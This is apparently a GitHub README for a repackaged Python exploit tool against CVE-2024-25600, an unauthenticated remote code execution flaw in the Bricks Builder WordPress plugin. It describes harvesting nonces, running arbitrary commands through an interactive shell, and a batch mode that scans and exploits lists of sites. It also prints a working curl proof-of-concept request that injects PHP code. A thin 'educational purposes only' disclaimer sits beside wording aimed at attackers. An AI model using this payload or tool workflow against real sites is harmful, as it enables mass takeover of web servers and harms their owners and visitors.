# CVE-2024-25600 Exploit Tool 🚀

## Disclaimer: This tool is owned by [Tornad0007](https://github.com/Tornad0007), I edited the code for make it easier to other people that has issues.

# CVE-2024-25600 Bricks Builder plugin for WordPress

This tool is meticulously crafted to exploit the critical CVE-2024-25600 vulnerability identified in the Bricks Builder plugin for WordPress. This particular vulnerability exposes affected websites to unauthenticated remote code execution, posing a significant security threat. By leveraging this tool, attackers can automate the exploitation process, allowing them to execute arbitrary commands on vulnerable WordPress installations.

### Key Features:

1. **Automated Exploitation**: The tool automates the exploitation process by retrieving unique cryptographic tokens, known as nonces, from target WordPress sites. These nonces are pivotal for crafting malicious requests.

2. **Crafting and Sending Requests**: Leveraging the obtained nonces, the tool constructs and dispatches specially crafted requests to the vulnerable WordPress installations. These requests are designed to execute arbitrary commands on the target server.

3. **Response Processing**: Upon receiving responses from the server, the tool meticulously parses the HTML content to identify any error messages or indications of successful exploitation. If successful, it extracts and presents the results of the executed commands.

4. **Interactive Mode**: Engage with the target website in real-time 🕹️. Users can directly input commands to be executed on compromised systems, facilitating deeper exploitation.

5. **Vulnerability Checking**: The tool includes functionality to ascertain if a given WordPress site is susceptible to the CVE-2024-25600 vulnerability. It achieves this by attempting exploitation and analyzing server responses.

6. **Batch Mode**: To streamline operations, the tool supports batch processing, enabling users to provide a list of target URLs for vulnerability scanning and exploitation.

### Installation 🛠️

1. Clone this repository to your local machine 🖥️ using `git clone`.
2. Navigate to the directory of the cloned repository.
3. Install the required Python libraries using `pip install -r requirements.txt`.

### Usage 📖

**Interactive Mode** 🎮

- Run the tool with `python exploit.py --url <URL>` to start interactive mode.
- Follow the on-screen prompts to send commands to the target server.

**Batch Mode** 📊

- Prepare a text file with a list of target URLs.
- Run the tool with `python exploit.py --list <file_path>` to scan and exploit the listed sites.

For more detailed usage instructions and options, please refer to the [original repository](https://github.com/Tornad0007/CVE-2024-25600-Bricks-Builder-plugin-for-WordPress/tree/main).

### Proof of Concept (PoC) 📝

The base PoC provided by the disclosure is as follows:

```bash
curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \
-H "Content-Type: application/json" \
-d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": {
    "name": "container",
    "settings": {
      "hasLoop": "true",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "throw new Exception(`id`);",
        "objectType": "post"
      }
    }
  }
}'
```

Replace `[HOST]` with the target website and `[NONCE]` with the nonce value retrieved from the site.

### Reference 📖

For more information about the CVE-2024-25600 vulnerability, please refer to the detailed disclosure at Snicco.io.

### Disclaimer ⚠️

The information provided in this README is for educational purposes only. Unauthorized hacking into websites or networks is illegal and unethical. 🚫

### Acknowledgements 🙏

Kudos to the security researchers who discovered and reported this vulnerability, providing the community with information and tools to help secure their web applications.

### Changes I Made to the Code:

- **Interactive Shell Functionality**: Modified the `interactive_shell` method to properly handle user input. Now, it correctly compares the lowercase version of the input command to exit or clear the shell.
  
- **Process Response Method**: Adjusted the `process_response` method to ensure the extracted text properly handles cases where the payload is not enough for Remote Code Execution (RCE). The extracted text now reflects this scenario more accurately.
  
- **Vulnerability Checking**: Updated the `check_vulnerability` method to print a message when the vulnerability check encounters an error, improving error handling and user feedback.
  
- **Main Function**: Incorporated command-line argument parsing using the argparse module, providing users with more flexibility in specifying the URL, list of URLs, and output file for vulnerable URLs.
  
- **Code Formatting**: Ensured consistent code formatting and adhered to PEP 8 style guidelines for better readability and maintainability.

These changes enhance the functionality, usability, and robustness of the exploit tool, making it more effective for identifying and exploiting the CVE-2024-25600 vulnerability in the Bricks Builder plugin for WordPress.

<h1> <strong>Thank you for reading, don't forget to star it so you don't lose it.</strong> </h1>
Also share it if it was usefull.
